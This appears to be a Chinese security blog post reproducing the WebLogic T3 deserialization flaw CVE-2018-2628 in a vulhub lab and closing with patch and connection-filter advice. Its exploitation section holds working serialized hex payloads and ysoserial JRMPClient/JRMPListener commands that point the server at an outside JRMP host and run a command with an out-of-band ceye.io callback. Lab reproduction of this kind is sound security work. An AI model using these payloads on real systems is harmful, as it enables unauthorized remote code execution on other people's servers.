---
layout: post
title: "CVE-2018-2628 WebLogic反序列化漏洞"
date: 2018-04-23
description: "CVE-2018-2628 WebLogic反序列化漏洞"
tag: 应用安全
---

------
## 前言
WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。  
### 漏洞描述
Oracle官方在2018年4月18日凌晨发布了关键补丁更新，其中包含了Oracle WebLogic Server的一个高危的Weblogic反序列化漏洞，通过该漏洞，攻击者可以在未授权的情况下远程执行代码。
此漏洞产生于Weblogic T3服务，当开放Weblogic控制台端口（默认为7001端口）时，T3服务会默认开启，因此会造成较大影响。结合曾经爆出的Weblogic WLS 组件漏洞（CVE-2017-10271），不排除会有攻击者利用漏洞挖矿的可能，因此，建议受影响企业用户尽快部署防护措施。
### 影响版本
```
Weblogic 10.3.6.0
Weblogic 12.1.3.0
Weblogic 12.2.1.2
Weblogic 12.2.1.3
```
## 漏洞复现
### 漏洞环境搭建
使用vulhub的weblogic的[docker环境](https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271)，漏洞版本为10.3.6.0，启动情况如下
![](/images/posts/app_sec/weblogic_cve_2018_2628_vuln_env.png)
### 漏洞利用
网上前几日已经流出[自检POC](/extra/weblogic_poc.cve-2018-2628.py)
1. 简单分析下POC
T3handshake建立握手
buildT3RequestObject判断有没有打补丁版本信息等
SendEvilObjData发送Payload
2. 分析PAYLOAD
* POC中的序列化PAYLOAD如下：
```
PAYLOAD = ['aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078']
```
* 转为ascii为:
![](/images/posts/app_sec/weblogic_cve_2018_2628_payload1_ascii.png)
* 可以看到调用链:
```
java.rmi.activation.Activator->java.lang.reflect.Proxy->java/lang/reflect/InvocationHandler->
java.rmi.server.RemoteObjectInvocationHandler->java.rmi.server.RemoteObject->UnicastRef
```
* 后面的104.251.228.50是JRMP服务端，用来传递恶意对象。

3. 使用[ysoserial](https://github.com/frohoff/ysoserial)生成指向自己JRMP服务端的payload
```
java -jar ysoserial-master.jar JRMPClient 39.108.xxx.xx:1099 > jrmpclient.payload
```
* jrmpclient.payload的ascii如下:
![](/images/posts/app_sec/weblogic_cve_2018_2628_payload2_ascii.png)
* 此时的调用链:
```
java.rmi.registry.Registry-> java.lang.reflect.Proxy-> java/lang/reflect/InvocationHandler-> java.rmi.server.RemoteObjectInvocationHandle-> java.rmi.server.RemoteObject
```
* jrmpclient.payload对应的十六进制字节码如下
```
aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707736000a556e6963617374526566000d33392e3130382e3138352e37390000044b000000004026f4b900000000000000000000000000000078
```
* 使用jrmpclient.payload的十六进制字节码替换POC中的PAYLOAD
4. 使用ysoserial搭建自己的JRMP服务端，执行任意命令
```
java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'ping weblogic.xxxxx.ceye.io'
```
![](/images/posts/app_sec/weblogic_cve_2018_2628_jr
mp_server.png)

5. 执行POC
* POC得到如下输出：
![](/images/posts/app_sec/weblogic_cve_2018_2628_poc_exec.png)
* weblogic服务器报错:
![](/images/posts/app_sec/weblogic_cve_2018_2628_weblogic_out.png)
* JRMP服务端接收到weblogic服务器的请求，并返回恶意对象：
![](/images/posts/app_sec/weblogic_cve_2018_2628_jrmp_out.png)
* Ceye显示命令成功执行：
![](/images/posts/app_sec/weblogic_cve_2018_2628_verify.png)

## 修复建议
### 官方补丁
Oracle官方已经在4月18号的关键补丁更新中修复了此漏洞，受影响的用户请尽快升级更新进行防护。
可使用正版软件许可账户登录 [https://support.oracle.com](https://support.oracle.com)，下载最新补丁。
### 手工修复
若要利用该漏洞, 攻击者首先需要与WebLogic Server提供的T3服务端口建立SOCKET连接, 运维人员可通过控制T3协议的访问权限来临时阻断漏洞利用。
WebLogic Server 提供了名叫“weblogic.security.net.ConnectionFilterImpl”的默认连接筛选器。该连接筛选器可控制所有传入连接，通过修改此连接筛选器规则，可对T3及T3S协议进行访问控制。
## 参考链接
[http://blog.topsec.com.cn/ad_lab/cve-2018-2628-weblogic反序列化漏洞分析](http://blog.topsec.com.cn/ad_lab/cve-2018-2628-weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)  
[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)